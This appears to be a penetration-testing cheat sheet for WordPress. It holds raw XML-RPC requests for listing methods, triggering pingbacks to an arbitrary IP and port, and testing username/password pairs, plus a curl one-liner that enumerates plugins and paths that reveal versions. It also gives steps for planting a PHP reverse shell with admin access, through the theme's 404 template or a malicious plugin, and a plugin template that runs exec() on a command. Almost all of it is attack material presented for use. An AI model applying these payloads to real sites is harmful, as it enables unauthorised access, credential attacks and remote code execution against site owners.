### List possible methods using rpc api
```
POST /xmlrpc.php HTTP/1.1
Host: <domain>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Length: XXX

<methodCall>  
<methodName>system.listMethods</methodName>  
<params></params>  
</methodCall>  
```

### Example - send a ping
```
POST /xmlrpc.php HTTP/1.1
Host: <domain>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Length: XXX

<methodCall>  
<methodName>pingback.ping</methodName>  
<params><param>  
<value><string>http://XXX.XXX.XXX.XXX:XX</string></value>  
</param><param><value><string>https://<domain>/wordpres?p=1</string>  
</value></param></params>  
</methodCall>  
```

### Methods for enumeration
```
wp.getUserBlogs
wp.getCategories
metaWeblog.getUsersBlogs

<methodCall>  
<methodName>wp.getUsersBlogs</methodName>  
<params>  
<param><value>username</value></param>  
<param><value>password</value></param>  
</params>  
</methodCall>  
```

### Version paths
```
/wp-content/themes/<theme-slug>
/wp-content/themes/<slug>/style.css
/wp-content/plugins/<slug>/readme.txt'
```

### Enumerate Plugins
```
curl -s "https://<rhost>/wp-json" | jq -r '.routes | keys[]' | egrep -v '^(/wp/v[0-9]|/oembed/|/$)' | egrep -o '^/[^/]+' | sort -u 
```

### Upload reverse shell with admin access - using custom 404 page
```
Appearance > Editor/Theme Editor > Theme Files > 404/404 Template > Selected file content > <phpReverseShell> > Update File
```

### Upload reverse shell with admin access - using malicious plugin
```
Plugins > Add New > Upload Plugin > Browse > Choose PHP reverse shell (rev.zip) > Install > Activate Plugin
```

### Template of PHP reverse shell
```
<?php
/**
* Plugin Name: Wordpress Reverse Shell
* Author: Haxxor
*/

exec("<command>")  
?>  
```

